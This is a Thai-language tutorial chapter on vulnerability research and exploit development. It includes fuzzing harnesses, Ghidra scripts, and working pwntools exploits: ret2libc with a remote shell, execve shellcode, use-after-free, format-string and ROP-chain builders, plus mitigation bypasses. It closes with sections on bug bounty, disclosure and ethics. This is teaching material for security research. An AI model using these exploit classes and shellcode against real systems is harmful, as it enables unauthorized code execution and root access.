# Part 98: Zero-Day Research & Exploit Development (การวิจัยช่องโหว่และพัฒนา Exploit)

## สารบัญ
1. [พื้นฐาน Vulnerability Research](#1-พื้นฐาน-vulnerability-research)
2. [Fuzzing Techniques](#2-fuzzing-techniques)
3. [Binary Analysis ด้วย Ghidra](#3-binary-analysis-ด้วย-ghidra)
4. [Buffer Overflow Advanced](#4-buffer-overflow-advanced)
5. [Heap Exploitation](#5-heap-exploitation)
6. [Format String Vulnerabilities](#6-format-string-vulnerabilities)
7. [Use-After-Free (UAF)](#7-use-after-free-uaf)
8. [Kernel Exploitation Basics](#8-kernel-exploitation-basics)
9. [ROP Chain Development](#9-rop-chain-development)
10. [Exploit Mitigations และ Bypass](#10-exploit-mitigations-และ-bypass)
11. [CVE Analysis และ PoC Development](#11-cve-analysis-และ-poc-development)
12. [Bug Bounty สำหรับ Researchers](#12-bug-bounty-สำหรับ-researchers)
13. [Responsible Disclosure](#13-responsible-disclosure)
14. [Research Tools และ Resources](#14-research-tools-และ-resources)
15. [อาชีพและจริยธรรมใน Security Research](#15-อาชีพและจริยธรรมใน-security-research)

---

## 1. พื้นฐาน Vulnerability Research

### ประเภทของ Vulnerabilities

```
ช่องโหว่ระดับ Memory Safety:
├─ Buffer Overflow
│   ├─ Stack-based (EIP/RIP overwrite)
│   └─ Heap-based (metadata corruption)
├─ Use-After-Free (UAF)
├─ Heap Spray / Heap Feng Shui
├─ Format String
├─ Integer Overflow/Underflow
├─ Type Confusion
└─ Double Free

ช่องโหว่ระดับ Logic:
├─ Authentication Bypass
├─ Privilege Escalation
├─ Race Conditions (TOCTOU)
└─ Insecure Deserialization
```

### กระบวนการค้นหา 0-day

```
1. Target Selection
   → เลือก software ที่มีผู้ใช้หลาย, ไม่มี source code
   
2. Attack Surface Mapping
   → Input vectors: files, network, IPC, syscalls
   → ใช้ static analysis (Ghidra, IDA, Cutter)
   
3. Vulnerability Discovery
   → Fuzzing: AFL++, LibFuzzer, Boofuzz
   → Code Auditing: manual review, code patterns
   → Symbolic Execution: angr, KLEE
   
4. Crash Analysis
   → วิเคราะห์ crash dumps
   → ตรวจสอบ exploitability
   
5. Exploit Development
   → หา control flow hijack primitive
   → สร้าง ROP chain / shellcode
   → Bypass mitigations (ASLR, DEP, CFG)
   
6. Responsible Disclosure
   → แจ้ง vendor, ออก CVE
```

### เครื่องมือสำหรับ Static Analysis

```bash
# Checksec - ตรวจสอบการป้องกัน binary
checksec --file=./target_binary
checksec --format=json --file=./target_binary

# file และ strings
file ./target_binary
strings ./target_binary | grep -E '(pass|user|admin|secret|key|token)'

# objdump - disassemble
objdump -d ./target_binary | head -100
objdump -d ./target_binary | grep -A3 'call.*gets\|call.*strcpy\|call.*sprintf'

# ltrace/strace - ติดตาม library/system calls
strace ./target_binary 2>&1 | head -50
ltrace ./target_binary 2>&1 | grep -E '(gets|strcpy|sprintf|system)'

# readelf สำหรับส่วน ELF
readelf -h ./target_binary  # Headers
readelf -s ./target_binary  # Symbols
readelf -l ./target_binary  # Program headers
readelf -d ./target_binary  # Dynamic section
```

---

## 2. Fuzzing Techniques

### AFL++ Fuzzing

```bash
# ติดตั้ง AFL++
apt-get install afl++
# หรือ compile from source
git clone https://github.com/AFLplusplus/AFLplusplus
cd AFLplusplus && make distrib && make install

# Compile target ด้วย AFL instrumentation
afl-clang-fast -o target_fuzz target.c
afl-clang-fast++ -o target_fuzz target.cpp -lstdc++

# สร้าง input corpus
mkdir inputs outputs
echo 'hello' > inputs/seed1
echo 'test123' > inputs/seed2

# เริ่ม fuzzing
afl-fuzz -i inputs -o outputs -- ./target_fuzz @@

# Parallel fuzzing (ใช้ multiple cores)
afl-fuzz -i inputs -o outputs -M fuzzer01 -- ./target_fuzz @@
afl-fuzz -i inputs -o outputs -S fuzzer02 -- ./target_fuzz @@
afl-fuzz -i inputs -o outputs -S fuzzer03 -- ./target_fuzz @@

# ผลลัพธ์
afl-whatsup outputs/  # ดู status
ls outputs/default/crashes/  # ดู crashes
ls outputs/default/hangs/    # ดู timeouts
```

### LibFuzzer สำหรับ Library Fuzzing

```c
// libfuzzer harness ตัวอย่าง
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include "target_library.h"

// LLVMFuzzerTestOneInput เป็น entry point สำหรับ libfuzzer
int LLVMFuzzerTestOneInput(const uint8_t *data, size_t size) {
    if (size < 4) return 0;
    
    // แปลง input เป็นรูปแบบที่ target รับ
    char buf[256];
    size_t copy_len = size < 255 ? size : 255;
    memcpy(buf, data, copy_len);
    buf[copy_len] = '\0';
    
    // เรียก vulnerable function
    target_parse_input(buf);
    return 0;
}
```

```bash
# Compile LibFuzzer harness
clang -g -fsanitize=address,fuzzer -o fuzz_target fuzz_harness.c -ltarget_lib

# เริ่ม fuzzing
./fuzz_target -max_total_time=3600 -max_len=1024 corpus/

# พร้อม AddressSanitizer เพื่อตรวจจับ memory bugs
clang -g -fsanitize=address,undefined,fuzzer -o fuzz_target fuzz_harness.c
```

### Python Fuzzer สำหรับ Network Protocols

```python
import socket
import struct
import random
import time
from typing import List, Callable

class NetworkFuzzer:
    def __init__(self, host: str, port: int, proto: str = 'tcp'):
        self.host = host
        self.port = port
        self.proto = proto
        self.crashes = []
    
    def _connect(self):
        if self.proto == 'tcp':
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((self.host, self.port))
        else:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(5)
        return sock
    
    def generate_payloads(self) -> List[bytes]:
        """สร้าง mutation-based payloads"""
        payloads = []
        
        # Boundary values
        for size in [0, 1, 127, 128, 255, 256, 1023, 1024, 65535, 65536]:
            payloads.append(b'A' * size)
        
        # Format string patterns
        payloads.extend([b'%s%s%s%s%s%n', b'%x%x%x%x%x', b'%d%d%d'])
        
        # NULL bytes
        payloads.append(b'\x00' * 100)
        payloads.append(b'A' * 50 + b'\x00' + b'A' * 50)
        
        # Binary patterns
        payloads.append(bytes(range(256)))
        payloads.append(b'\xff' * 200)
        
        # Random
        for _ in range(20):
            size = random.randint(1, 2048)
            payloads.append(bytes(random.getrandbits(8) for _ in range(size)))
        
        return payloads
    
    def fuzz(self, pre_send: bytes = None, log_crashes: bool = True) -> int:
        """เริ่ม fuzzing loop"""
        payloads = self.generate_payloads()
        crash_count = 0
        
        for i, payload in enumerate(payloads):
            try:
                sock = self._connect()
                if pre_send:
                    sock.send(pre_send)
                    time.sleep(0.1)
                sock.send(payload)
                resp = sock.recv(1024)
                sock.close()
                print(f'[{i}] OK - {len(payload)} bytes - resp: {len(resp)} bytes')
            except ConnectionRefusedError:
                print(f'[{i}] CRASH detected! Payload size: {len(payload)}')
                crash_count += 1
                if log_crashes:
                    self.crashes.append({'payload': payload.hex(), 'index': i})
            except socket.timeout:
                print(f'[{i}] Timeout - possible hang')
            except Exception as e:
                print(f'[{i}] Error: {e}')
        
        return crash_count
    
    def minimize_crash(self, crashing_payload: bytes) -> bytes:
        """ย่อ payload ให้เล็กที่สุด"""
        minimal = crashing_payload
        for i in range(len(crashing_payload), 0, -1):
            test = crashing_payload[:i]
            try:
                sock = self._connect()
                sock.send(test)
                sock.recv(1024)
                sock.close()
            except ConnectionRefusedError:
                minimal = test
        return minimal
```

---

## 3. Binary Analysis ด้วย Ghidra

```python
# Ghidra Script (Python) สำหรับอัตโนมัติ analysis
from ghidra.app.script import GhidraScript
from ghidra.program.model.listing import Function
from ghidra.program.model.symbol import SymbolType

class VulnerableFunctionFinder(GhidraScript):
    
    DANGEROUS_FUNCTIONS = [
        'gets', 'strcpy', 'strcat', 'sprintf', 'scanf',
        'vsprintf', 'wcscpy', 'wcscat', 'memcpy', 'strncpy'
    ]
    
    def run(self):
        """Main function - ค้นหาฟังก์ชันอันตราย"""
        found = []
        
        function_manager = self.currentProgram.getFunctionManager()
        functions = function_manager.getFunctions(True)
        
        for func in functions:
            func_name = func.getName().lower()
            if any(dangerous in func_name for dangerous in self.DANGEROUS_FUNCTIONS):
                callers = self.getCallingFunctions(func)
                for caller in callers:
                    found.append({
                        'dangerous_func': func_name,
                        'called_by': caller.getName(),
                        'address': caller.getEntryPoint()
                    })
        
        # พิมพ์ผลลัพธ์
        for item in found:
            print(f"[!] {item['dangerous_func']} called by {item['called_by']} at {item['address']}")
    
    def getCallingFunctions(self, func):
        callers = []
        refs = self.getReferencesTo(func.getEntryPoint())
        for ref in refs:
            caller = self.getFunctionContaining(ref.getFromAddress())
            if caller:
                callers.append(caller)
        return callers
```

```bash
# Ghidra Headless Analysis
ghidraRun /opt/ghidra/support/analyzeHeadless \
  /tmp/ghidra_project ProjectName \
  -import ./target_binary \
  -postScript VulnFinder.py \
  -scriptlog /tmp/ghidra_output.txt

# หรือใช้ r2 (radare2)
r2 -A ./target_binary
# Commands:
# afl       → list functions
# pdf@main  → disassemble main
# axt sym.gets  → cross-refs to gets
# iz        → strings
# iI        → binary info

# Cutter (GUI for radare2)
cutter ./target_binary
```

---

## 4. Buffer Overflow Advanced

### x64 Stack Buffer Overflow

```python
# x64 Buffer Overflow PoC
from pwn import *
import subprocess

class BufferOverflowExploiter:
    def __init__(self, binary_path: str, remote_host: str = None, port: int = None):
        self.binary_path = binary_path
        self.remote = (remote_host, port) if remote_host else None
        self.elf = ELF(binary_path)
        
        # ตรวจสอบ mitigations
        self.has_nx = self.elf.nx  # Non-Executable stack
        self.has_pie = self.elf.pie  # Position Independent Executable
        self.has_canary = self.elf.canary  # Stack Canary
    
    def find_offset(self) -> int:
        """หา offset ด้วย cyclic pattern"""
        pattern = cyclic(200)
        
        p = process(self.binary_path)
        p.sendline(pattern)
        p.wait()
        
        core = Coredump('./core')
        offset = cyclic_find(core.fault_addr & 0xffffffff)
        print(f'[*] Offset: {offset}')
        return offset
    
    def build_rop_chain_ret2libc(self, libc_path: str, offset: int) -> bytes:
        """ret2libc โดยไม่ต้องรู้ที่อยู่"""
        libc = ELF(libc_path)
        rop = ROP(self.elf)
        
        # Leak libc base address ผ่าน puts
        puts_plt = self.elf.plt['puts']
        puts_got = self.elf.got['puts']
        main_addr = self.elf.symbols['main']
        
        # Gadgets
        pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
        ret = rop.find_gadget(['ret'])[0]
        
        # Stage 1: Leak puts address
        stage1 = b'A' * offset
        stage1 += p64(pop_rdi)
        stage1 += p64(puts_got)
        stage1 += p64(puts_plt)
        stage1 += p64(main_addr)  # กลับ main เพื่อ exploit รอบ 2
        
        return stage1
    
    def build_stage2(self, libc: ELF, leaked_puts: int) -> bytes:
        """Stage 2: หลังรู้ที่อยู่ของ libc"""
        libc.address = leaked_puts - libc.symbols['puts']
        print(f'[*] libc base: {hex(libc.address)}')
        
        rop = ROP(libc)
        pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
        ret = rop.find_gadget(['ret'])[0]
        
        bin_sh = next(libc.search(b'/bin/sh'))
        system = libc.symbols['system']
        
        # เรียก system('/bin/sh')
        stage2 = b'A' * 72  # offset
        stage2 += p64(ret)        # เพื่อ align stack 16-byte
        stage2 += p64(pop_rdi)
        stage2 += p64(bin_sh)
        stage2 += p64(system)
        
        return stage2
    
    def exploit_remote(self, stage1: bytes, stage2: bytes) -> bool:
        """ส่ง payload ไปยัง remote target"""
        if not self.remote:
            return False
        
        host, port = self.remote
        
        # Stage 1 - leak libc
        r = remote(host, port)
        r.recv()
        r.sendline(stage1)
        
        leaked = u64(r.recv(6).ljust(8, b'\x00'))
        print(f'[*] Leaked puts: {hex(leaked)}')
        r.close()
        
        # Stage 2 - get shell
        r = remote(host, port)
        r.recv()
        r.sendline(stage2)
        r.interactive()
        return True
```

### การเขียน shellcode x64

```nasm
; execve('/bin/sh', NULL, NULL) shellcode x64 Linux
; 27 bytes
section .text
global _start

_start:
    ; xor rax, rax
    xor    eax, eax
    
    ; push '/bin/sh\0'
    push   rax          ; NULL terminator
    mov    rbx, 0x68732f6e69622f2f  ; '//bin/sh'
    push   rbx
    
    mov    rdi, rsp     ; rdi = pointer to '/bin/sh'
    
    ; rsi = NULL (argv)
    push   rax
    mov    rsi, rsp
    
    ; rdx = NULL (envp)
    xor    edx, edx
    
    ; syscall execve = 59
    mov    al, 59
    syscall
```

```python
# shellcode หลีกเลี่ยง bad bytes
from pwn import asm, context

context.arch = 'amd64'
context.os = 'linux'

# Shellcode ที่หลีกเลี่ยง null bytes
shellcode = asm("""
    push 0x42
    pop rax
    push rax
    pop rbx
    xor al, al
    push rax
    mov rbx, 0x68732f6e69622f2f
    push rbx
    push rsp
    pop rdi
    xor esi, esi
    xor edx, edx
    push 0x3b
    pop rax
    syscall
""")
print(shellcode.hex())
```

---

## 5. Heap Exploitation

```c
// Use-After-Free ตัวอย่าง
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

typedef struct {
    char name[32];
    void (*print_func)(char*);
} User;

void admin_func(char* msg) {
    printf("[ADMIN] %s\n", msg);
    system("/bin/sh");  // แฟลก function
}

void normal_func(char* msg) {
    printf("[USER] %s\n", msg);
}

int main() {
    User *user = malloc(sizeof(User));
    user->print_func = normal_func;
    strcpy(user->name, "bob");
    
    free(user);  // user ถูก free แต่ pointer ยังใช้ได้!
    
    // โจมตี: allocate เหมือนกันและเขียนทับด้วยแอดเดรสของ admin_func
    char *fake = malloc(sizeof(User));
    // เขียน admin_func address ลงใน fake chunk
    *((void**)(fake + 32)) = admin_func;  // offset ของ print_func
    
    // UAF: ใช้ user pointer ที่ freed แล้ว
    user->print_func("pwned!");  // เรียก admin_func = shell!
    return 0;
}
```

```python
# Tcache Poisoning (glibc 2.26+)
# แนวคิด: แก้ไข fd pointer ใน tcache chunk เพื่อสร้าง arbitrary write
from pwn import *

def tcache_poison_demo():
    """
    Demo: Tcache Poison เพื่อ เขียนไปยังที่ใดก็ได้
    """
    # 1. Allocate 2 chunks of same size
    # chunk_a = malloc(0x50)
    # chunk_b = malloc(0x50)
    
    # 2. Free both (tcache LIFO)
    # free(chunk_b)
    # free(chunk_a)  <-- tcache: [chunk_a -> chunk_b -> ...]
    
    # 3. Write target address into chunk_a's fd
    # *(size_t*)chunk_a = TARGET_ADDR
    
    # 4. Allocate twice - 2nd malloc returns TARGET_ADDR
    # x = malloc(0x50)  <-- chunk_a คืน
    # y = malloc(0x50)  <-- TARGET_ADDR คืน!!
    
    # 5. Write to y = write to TARGET_ADDR
    pass
```

---

## 6. Format String Vulnerabilities

```c
// Format String Vulnerability ตัวอย่าง
void vulnerable(char *input) {
    printf(input);  // DANGEROUS! ต้องเป็น printf("%s", input);
}
```

```python
from pwn import *

class FormatStringExploiter:
    def __init__(self, binary, io):
        self.binary = ELF(binary)
        self.io = io
    
    def leak_stack(self, num_entries: int = 20) -> list:
        """อ่านค่าบน stack"""
        leaked = []
        for i in range(1, num_entries + 1):
            payload = f'%{i}$p'.encode()
            self.io.sendline(payload)
            response = self.io.recvline().strip()
            leaked.append((i, response))
        return leaked
    
    def leak_arbitrary_address(self, address: int, offset: int = 6) -> bytes:
        """อ่าน 4 bytes จาก address"""
        payload = p32(address) + f'%{offset}$s'.encode()
        self.io.sendline(payload)
        response = self.io.recv()
        # Skip first 4 bytes (address we sent)
        return response[4:]
    
    def write_byte(self, address: int, value: int, offset: int = 6) -> bytes:
        """Write byte using %n"""
        # สร้าง format string เพื่อเขียน value bytes, แล้วใช้ %hhn
        payload = p64(address)
        if value > 8:  # ลบ 8 bytes บน address
            payload += f'%{value - 8}c'.encode()
        payload += f'%{offset}$hhn'.encode()
        return payload
    
    def generate_pwntools_fmtstr(self, writes: dict) -> bytes:
        """ใช้ pwntools fmtstr_payload"""
        return fmtstr_payload(6, writes)

# ตัวอย่าง
# ป้องกัน: ใช้ printf("%s", user_input) แทน printf(user_input)
```

---

## 7. Use-After-Free (UAF)

```python
# วิเคราะห์ UAF ด้วย Python และ pwntools
from pwn import *

def analyze_uaf_binary(binary_path):
    """วิเคราะห์ binary ว่ามี UAF ไหม"""
    elf = ELF(binary_path)
    
    # หา patterns ที่น่าสงสัย
    with open(binary_path, 'rb') as f:
        data = f.read()
    
    # หา free() calls
    suspicious_patterns = []
    
    # ใช้ radare2 python bindings
    try:
        import r2pipe
        r2 = r2pipe.open(binary_path)
        r2.cmd('aaa')  # analyze
        
        # หา cross-refs ของ free
        free_xrefs = r2.cmdj('axtj sym.imp.free')
        malloc_xrefs = r2.cmdj('axtj sym.imp.malloc')
        
        print(f'free() calls: {len(free_xrefs)}')
        print(f'malloc() calls: {len(malloc_xrefs)}')
        
        for xref in free_xrefs:
            print(f'  free() called at: {hex(xref["from"])}')
        
        r2.quit()
    except ImportError:
        print('r2pipe not installed: pip install r2pipe')

# UAF Exploitation Pattern
UAF_EXPLOIT_PATTERN = """
1. Allocate chunk (type A)
2. Free chunk (but keep pointer!)
3. Allocate same-size chunk (type B)
4. Type B overlaps with freed type A
5. Write attacker-controlled data via type B
6. Use type A pointer -> controlled data
"""
```

---

## 8. Kernel Exploitation Basics

```c
// Kernel Module สำหรับการเรียนรู้
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/fs.h>
#include <linux/uaccess.h>

#define DEVICE_NAME "vuln_dev"
#define BUF_SIZE 64

static char kernel_buffer[BUF_SIZE];

static ssize_t device_write(struct file *f, const char __user *buf,
                             size_t len, loff_t *off) {
    // Vulnerable: no bounds check!
    // copy_from_user(kernel_buffer, buf, len)  // DANGEROUS if len > BUF_SIZE
    
    // Safe version:
    if (len > BUF_SIZE) return -EINVAL;
    if (copy_from_user(kernel_buffer, buf, len)) return -EFAULT;
    return len;
}
```

```python
# Kernel Privilege Escalation ด้วย commit_creds
# (Educational - เพื่อการเรียนรู้)
KERNEL_EXPLOIT_TEMPLATE = """
// หลังจากได้ kernel code execution:
void privesc() {
    // เรียก commit_creds(prepare_kernel_cred(0))
    // เพื่ออัปเกรด UID เป็น root (uid=0)
    commit_creds_func(prepare_kernel_cred_func(0));
}
"""

# Tools สำหรับ kernel exploitation research:
KERNEL_TOOLS = {
    'qemu': 'สร้าง VM สำหรับทดสอบ kernel exploits',
    'syzkaller': 'Kernel fuzzer จาก Google',
    'pwndbg': 'GDB plugin พร้อม kernel debugging support',
    'kgdb': 'Linux Kernel GDB debugger',
    'volatility': 'Memory forensics สำหรับ analyze kernel state',
    'bpftrace': 'Kernel tracing ด้วย eBPF'
}
```

---

## 9. ROP Chain Development

```python
from pwn import *

class ROPChainBuilder:
    def __init__(self, binary_path: str, libc_path: str = None):
        self.elf = ELF(binary_path)
        self.rop = ROP(self.elf)
        self.libc = ELF(libc_path) if libc_path else None
    
    def find_gadgets(self):
        """หา useful gadgets"""
        gadgets = {
            'pop_rdi': None, 'pop_rsi': None, 'pop_rdx': None,
            'pop_rax': None, 'syscall': None, 'ret': None
        }
        
        try:
            gadgets['pop_rdi'] = self.rop.find_gadget(['pop rdi', 'ret'])[0]
            gadgets['pop_rsi'] = self.rop.find_gadget(['pop rsi', 'pop r15', 'ret'])[0]
            gadgets['pop_rdx'] = self.rop.find_gadget(['pop rdx', 'ret'])[0]
            gadgets['pop_rax'] = self.rop.find_gadget(['pop rax', 'ret'])[0]
            gadgets['syscall'] = self.rop.find_gadget(['syscall'])[0]
            gadgets['ret'] = self.rop.find_gadget(['ret'])[0]
        except Exception as e:
            print(f'Gadget not found: {e}')
        
        return gadgets
    
    def build_execve_rop(self, bin_sh_addr: int, offset: int) -> bytes:
        """สร้าง ROP chain สำหรับ execve('/bin/sh')"""
        gadgets = self.find_gadgets()
        
        chain = b'A' * offset  # Padding
        chain += p64(gadgets['ret'])  # Stack alignment
        
        # rdi = "/bin/sh"
        chain += p64(gadgets['pop_rdi'])
        chain += p64(bin_sh_addr)
        
        # rsi = NULL
        chain += p64(gadgets['pop_rsi'])
        chain += p64(0)
        chain += p64(0)  # r15
        
        # rdx = NULL
        if gadgets['pop_rdx']:
            chain += p64(gadgets['pop_rdx'])
            chain += p64(0)
        
        # rax = 59 (execve syscall)
        chain += p64(gadgets['pop_rax'])
        chain += p64(59)
        
        # syscall
        chain += p64(gadgets['syscall'])
        
        return chain
    
    def build_rop_call_system(self, offset: int) -> bytes:
        """สร้าง ROP chain เรียก system('/bin/sh') ผ่าน libc"""
        if not self.libc:
            return b''
        
        gadgets = self.find_gadgets()
        bin_sh = next(self.libc.search(b'/bin/sh'))
        system = self.libc.symbols['system']
        
        chain = b'A' * offset
        chain += p64(gadgets['ret'])  # 16-byte align
        chain += p64(gadgets['pop_rdi'])
        chain += p64(bin_sh)
        chain += p64(system)
        
        return chain

# ตัวอย่าง
binary = './challenge'
builder = ROPChainBuilder(binary, '/lib/x86_64-linux-gnu/libc.so.6')
gadgets = builder.find_gadgets()
for name, addr in gadgets.items():
    if addr:
        print(f'{name}: {hex(addr)}')
```

---

## 10. Exploit Mitigations และ Bypass

```
มาตรการป้องกัน และวิธี bypass:

1. ASLR (Address Space Layout Randomization)
   - Bypass: Memory leak (อ่านที่อยู่จริง), brute force (32-bit)
   - Bypass: Format string leak, heap spray

2. NX/DEP (Non-Executable Stack/Data)
   - Bypass: ROP chains, ret2libc, JIT spraying
   
3. Stack Canary
   - Bypass: Leak canary, brute force (fork servers), format string
   
4. PIE (Position Independent Executable)
   - Bypass: Memory leak เพื่อหา base address
   
5. RELRO (Relocation Read-Only)
   - Full RELRO: ไม่สามารถ overwrite GOT
   - Partial RELRO: GOT still writable
   
6. CFG (Control Flow Guard - Windows)
   - Bypass: เซ็น indirect calls ที่ CFG valid targets
   
7. SafeStack
   - Bypass: Memory corruption บน unsafe stack
```

```bash
# ตรวจสอบ mitigations
checksec --file=./binary

# Output:
# RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH
# Full RELRO      Canary found      NX enabled    PIE enabled     No RPATH   No RUNPATH

# Disable ASLR สำหรับ testing
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space

# Compile โดยไม่มี mitigations
gcc -no-pie -fno-stack-protector -z execstack -o vuln vuln.c
```

---

## 11. CVE Analysis และ PoC Development

```python
import requests
from datetime import datetime
from typing import Dict, List

class CVEAnalyzer:
    NVD_API = 'https://services.nvd.nist.gov/rest/json/cves/2.0'
    
    def get_cve_info(self, cve_id: str) -> Dict:
        """ดึงข้อมูล CVE จาก NVD"""
        params = {'cveId': cve_id}
        resp = requests.get(self.NVD_API, params=params, timeout=30)
        if resp.status_code == 200:
            data = resp.json()
            vulnerabilities = data.get('vulnerabilities', [])
            if vulnerabilities:
                cve = vulnerabilities[0]['cve']
                
                # CVSS Score
                metrics = cve.get('metrics', {})
                cvss_v3 = metrics.get('cvssMetricV31', [{}])[0].get('cvssData', {})
                
                return {
                    'id': cve_id,
                    'description': cve['descriptions'][0]['value'],
                    'published': cve.get('published'),
                    'modified': cve.get('lastModified'),
                    'cvss_score': cvss_v3.get('baseScore'),
                    'cvss_vector': cvss_v3.get('vectorString'),
                    'severity': cvss_v3.get('baseSeverity'),
                    'references': [r['url'] for r in cve.get('references', [])[:5]]
                }
        return {}
    
    def search_cves_by_product(self, product: str, version: str = None,
                                severity: str = 'CRITICAL') -> List[Dict]:
        """ค้นหา CVEs สำหรับ product"""
        params = {
            'keywordSearch': product,
            'cvssV3Severity': severity,
            'resultsPerPage': 10
        }
        if version:
            params['versionStart'] = version
        
        resp = requests.get(self.NVD_API, params=params, timeout=30)
        if resp.status_code == 200:
            data = resp.json()
            results = []
            for vuln in data.get('vulnerabilities', []):
                cve = vuln['cve']
                metrics = cve.get('metrics', {})
                cvss_v3 = metrics.get('cvssMetricV31', [{}])[0].get('cvssData', {})
                results.append({
                    'id': cve['id'],
                    'description': cve['descriptions'][0]['value'][:200],
                    'score': cvss_v3.get('baseScore'),
                    'published': cve.get('published', '')[:10]
                })
            return results
        return []

class PoCDeveloper:
    """แนวทางการพัฒนา PoC"""
    
    POC_TEMPLATE = """
#!/usr/bin/env python3
"""
Proof of Concept for {cve_id}
Affected: {affected_software}
CVSS: {cvss_score}
Description: {description}
Author: Security Researcher
Date: {date}
Disclosure: {disclosure_url}

IMPORTANT: For educational and authorized testing only
"""
import sys
import requests

def exploit(target_url: str) -> bool:
    '''
    PoC เนื้อหา...
    '''
    # TODO: implement exploit
    pass

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print(f'Usage: python3 poc_{cve_id.replace("-","_")}.py <target_url>')
        sys.exit(1)
    result = exploit(sys.argv[1])
    sys.exit(0 if result else 1)
"""
    
    def create_poc_skeleton(self, cve_id: str, affected: str,
                             description: str, cvss: str) -> str:
        return self.POC_TEMPLATE.format(
            cve_id=cve_id,
            affected_software=affected,
            cvss_score=cvss,
            description=description[:100],
            date=datetime.utcnow().strftime('%Y-%m-%d'),
            disclosure_url=f'https://nvd.nist.gov/vuln/detail/{cve_id}'
        )
```

---

## 12. Bug Bounty สำหรับ Researchers

### Programs ที่ดี

| Platform | URL | ติดต่อได้หลาย |
|----------|-----|-------------------|
| HackerOne | hackerone.com | Top-tier programs |
| Bugcrowd | bugcrowd.com | Many VDPs |
| Intigriti | intigriti.com | EU-focused |
| Synack | synack.com | Private platform |
| YesWeHack | yeswehack.com | European |
| Google VRP | g.co/vulnz | จ่ายดี |
| Microsoft MSRC | msrc.microsoft.com | Severity-based |

### แนวทางการ Triage Bug Bounty

```python
class BugBountyReporter:
    REPORT_TEMPLATE = """## Vulnerability Summary
**Title**: {title}
**Severity**: {severity}
**CVSS Score**: {cvss}
**Program**: {program}

## Description
{description}

## Steps to Reproduce
{steps}

## Impact
{impact}

## Proof of Concept
```
{poc_code}
```

## Suggested Remediation
{remediation}

## References
{references}
"""
    
    SEVERITY_GUIDELINES = {
        'critical': {
            'cvss': '9.0-10.0',
            'examples': ['RCE as root/admin', 'Authentication bypass on all accounts',
                        'Plaintext passwords in database'],
            'response_sla': '24 hours'
        },
        'high': {
            'cvss': '7.0-8.9',
            'examples': ['SQLi with PII exfil', 'SSRF to internal services',
                        'Account takeover'],
            'response_sla': '72 hours'
        },
        'medium': {
            'cvss': '4.0-6.9',
            'examples': ['CSRF', 'Stored XSS', 'IDOR limited impact'],
            'response_sla': '1 week'
        },
        'low': {
            'cvss': '0.1-3.9',
            'examples': ['Information disclosure', 'Reflected XSS self'],
            'response_sla': '2 weeks'
        }
    }
    
    def generate_report(self, vuln_data: Dict) -> str:
        return self.REPORT_TEMPLATE.format(**vuln_data)
    
    def estimate_severity(self, vuln_type: str, scope: str) -> str:
        """ประเมิน severity"""
        critical_types = ['rce', 'sqli_auth_bypass', 'account_takeover', 'file_inclusion']
        high_types = ['sqli', 'ssrf_internal', 'idor_sensitive', 'stored_xss_no_interaction']
        medium_types = ['csrf', 'stored_xss', 'idor', 'open_redirect']
        
        vuln_lower = vuln_type.lower()
        if any(t in vuln_lower for t in critical_types):
            return 'critical'
        elif any(t in vuln_lower for t in high_types):
            return 'high'
        elif any(t in vuln_lower for t in medium_types):
            return 'medium'
        return 'low'
```

---

## 13. Responsible Disclosure

```
ขั้นตอน Responsible Disclosure:

1. ค้นหาช่องทางติดต่อของ vendor
   → security@company.com
   → Security Advisory Page
   → HackerOne / Bugcrowd program
   
2. เขียนรายงาน vulnerability อย่างเป็นขั้นตอน
   → Title, CVSS, Affected versions
   → Steps to reproduce
   → Impact assessment
   → PoC (minimal, no destructive actions)
   → Suggested fix
   
3. รอ vendor response (90 วัน standard window)
   → ถ้าไม่ตอบใน 14 วัน, escalate หรือ ติดต่อ CERT
   → ถ้า patch ไม่สร้างใน 90 วัน, อาจ publish full details
   
4. CVE Request
   → request ผ่าน https://cveform.mitre.org/
   → หรือผ่าน vendor (CNAs)
   
5. Public Disclosure
   → หลัง patch ออก หรือหลัง  90 วัน
   → Blog post, conference talk, CVE reference
```

---

## 14. Research Tools และ Resources

### เครื่องมือหลัก

| Tool | หน้าที่ | Platform |
|------|------|----------|
| **Ghidra** | Reverse engineering | Cross-platform |
| **IDA Pro** | Disassembler/Decompiler | Commercial |
| **radare2/Cutter** | RE framework | Open source |
| **GDB + pwndbg** | Dynamic analysis | Linux |
| **WinDbg** | Windows debugging | Windows |
| **AFL++** | Coverage-guided fuzzer | Linux |
| **LibFuzzer** | Library fuzzer | LLVM |
| **syzkaller** | Kernel fuzzer | Linux |
| **angr** | Symbolic execution | Python |
| **pwntools** | Exploit development | Python |
| **ROPgadget** | ROP gadget finder | Python |
| **one_gadget** | Find magic gadgets | Ruby |
| **checksec** | Binary mitigations check | Python |
| **PEDA/pwndbg/GEF** | GDB enhancements | Python |

```bash
# ติดตั้ง tools
pip install pwntools angr ropper
gem install one_gadget
apt-get install gdb pwndbg

# pwndbg setup
git clone https://github.com/pwndbg/pwndbg
cd pwndbg && ./setup.sh

# ROPgadget
ROPgadget --binary ./target --rop
ROPgadget --binary ./target --string '/bin/sh'
ROPgadget --binary ./target --only 'pop|ret'

# one_gadget (find execve gadgets in libc)
one_gadget /lib/x86_64-linux-gnu/libc.so.6
one_gadget -f /lib/x86_64-linux-gnu/libc.so.6  # level 1

# angr - symbolic execution
python3 -c "
import angr
proj = angr.Project('./binary', load_options={'auto_load_libs': False})
state = proj.factory.entry_state()
simgr = proj.factory.simgr(state)
simgr.explore(find=0x400500, avoid=0x400600)
if simgr.found:
    print(simgr.found[0].posix.dumps(0))
"
```

---

## 15. อาชีพและจริยธรรมใน Security Research

```
หลักการสำคัญ:

1. Do No Harm
   → ไม่ทำให้ระบบขาดเสถียร ไม่ลบข้อมูล
   → ไม่แชร์ ไม่ขาย vulnerabilities ก่อน patch

2. Scope Compliance
   → ทดสอบเฉพาะใน scope ที่กำหนด
   → ไม่ทดสอบ out-of-scope systems

3. Data Minimization
   → ไม่เก็บข้อมูลส่วนตัวของผู้ใช้
   → ใช้แค่ส่วนที่จำเป็นสำหรับ PoC
